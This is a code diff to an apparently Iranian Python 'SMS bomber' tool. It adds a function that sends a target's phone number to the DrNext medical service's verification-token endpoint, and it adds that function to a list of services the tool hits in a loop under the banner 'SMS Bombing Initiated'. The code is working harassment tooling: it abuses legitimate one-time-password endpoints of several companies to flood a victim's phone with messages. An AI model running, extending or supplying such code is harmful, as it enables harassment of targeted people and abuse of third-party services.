@@ -51,6 +51,21 @@ def snap(phone):
         print(f"{r}[!] Snap Exception: {e}")
         return False
 
+
+def drnext(phone):
+    phoneNumber_zero = "0" + phone.split("+98")[1]  # تبدیل +98 به 0 اول
+    url = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
+    payload = {"source": "besina", "mobile": phoneNumber_zero}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(DrNext) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (DrNext) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] (DrNext) Exception: {e}{a}')
+
 def gap(phone):
     try:
         gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1])).text
@@ -111,7 +126,7 @@ def send_service_safe(service, phone):
 
 # Simple SMS bomber
 def Vip(phone, Time):
-    services = [snap, gap, divar, alibaba, mek, okorosh]
+    services = [snap, gap, divar, alibaba, mek, drnext, okorosh]
     total_services = len(services)
     
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
